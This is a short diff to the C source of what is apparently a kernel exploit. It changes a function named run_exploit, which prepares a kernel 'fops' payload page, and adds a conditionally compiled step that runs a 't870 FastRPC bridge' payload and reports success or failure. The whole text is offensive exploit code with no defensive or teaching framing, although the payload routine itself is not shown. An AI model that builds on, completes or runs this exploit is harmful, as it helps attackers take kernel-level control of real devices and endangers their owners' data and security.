@@ -1,5 +1,10 @@
 #include "common.h"
 
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(T870_FASTRPC_BRIDGE) && T870_FASTRPC_BRIDGE
+#include "t870_fastrpc/t870_payload_bridge.h"
+#endif
+
 uint32_t f_wait;
 uint32_t f_pi_target;
 uint32_t f_pi_chain;
@@ -470,6 +475,20 @@ int run_exploit(int argc, char **argv) {
 #if !defined(APP_FOPS_REUSE_VERIFIED_PAGE) || \
     !APP_FOPS_REUSE_VERIFIED_PAGE
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+#endif
+
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(T870_FASTRPC_BRIDGE) && T870_FASTRPC_BRIDGE
+  if (!page_base) {
+    return 1;
+  }
+  int t870_bridge_result = t870_run_payload_bridge();
+  if (t870_bridge_result == 0) {
+    pr_success("t870 FastRPC bridge completed in detached owner\n");
+    return 0;
+  }
+  pr_error("t870 FastRPC bridge failed result=%d\n", t870_bridge_result);
+  return 1;
 #endif
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
